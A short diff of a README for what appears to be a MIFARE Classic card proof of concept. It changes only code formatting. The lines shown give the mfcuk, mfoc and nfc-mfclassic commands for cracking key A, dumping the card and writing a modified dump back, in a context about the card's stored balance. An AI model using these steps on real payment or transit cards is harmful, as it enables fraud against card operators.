@@ -23,11 +23,11 @@ This is not a big problem, since we can crack the key by ourselves. In order to 
 
 After installing everything, we need to run the following commands (with the reader and the card connected to the PC)
 
-`mfcuk -C -R 0:A -v 2`
+```mfcuk -C -R 0:A -v 2```
 
 This command will return a key, this is the key A of your card. Now we can run mfoc in order to dump the content of the card, providing the key that we've just found
 
-`mfoc -O dump.mfd -k KEYFOUNDBYMFCUK`
+```mfoc -O dump.mfd -k KEYFOUNDBYMFCUK```
 
 In this repo you WON'T find the key in order to avoid the misuse of this PoC.
 
@@ -46,8 +46,8 @@ In this repo you WON'T find the key in order to avoid the misuse of this PoC.
 example of a dump with a balance 0,32€
 
 - write the dump with 
-  
-  `nfc-mfclassic w a u dump.mfd dump.mfd`
+
+```nfc-mfclassic w a u dump.mfd dump.mfd```
   
   
 
